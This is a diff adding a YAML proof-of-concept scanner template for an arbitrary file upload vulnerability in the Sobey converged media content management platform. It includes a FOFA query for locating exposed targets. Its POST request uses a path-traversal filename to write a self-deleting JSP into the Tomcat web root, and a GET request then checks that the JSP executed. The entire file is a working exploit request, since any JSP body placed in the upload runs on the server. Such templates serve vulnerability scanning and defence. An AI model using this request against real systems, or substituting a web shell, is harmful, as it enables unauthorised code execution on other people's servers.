@@ -1,0 +1,31 @@
+id: poc-yaml-sobey-imcmp-upload-anyfile-upload
+info:
+  name: 索贝融合媒体内容管理平台 upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  t1: random_str(9)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /sobey-mchEditor/watermark/upload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/{{.t1}}.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,"\"status\":200") && contains(content_type,"application/json")
+- method: GET
+  path: /sobey-mchEditor/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
